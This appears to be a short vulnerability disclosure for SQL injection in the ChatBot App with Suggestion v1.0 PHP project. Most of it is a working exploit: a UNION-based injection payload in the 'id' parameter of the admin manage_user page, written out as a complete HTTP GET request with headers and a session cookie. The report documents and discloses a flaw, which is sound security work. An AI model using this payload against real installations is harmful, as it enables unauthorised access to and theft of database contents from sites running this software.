# ChatBot App with Suggestion v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15316/chatbot-app-suggestion-phpoop-free-source-code.html

Vulnerability File: /simple_chat_bot/admin/?page=user/manage_user&id=

Vulnerability location: /simple_chat_bot/admin/?page=user/manage_user&id=, id

[+] Payload: /simple_chat_bot/admin/?page=user/manage_user&id=-4%27%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ // Leak place ---> id

```sql
GET /simple_chat_bot/admin/?page=user/manage_user&id=-4%27%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/170819988-9f7418f3-f05c-4381-b09b-e1ec2ab31cfc.png)

![image](https://user-images.githubusercontent.com/54017627/170819979-df9a9514-79d8-4e3a-b013-c7f72e7ce9a7.png)
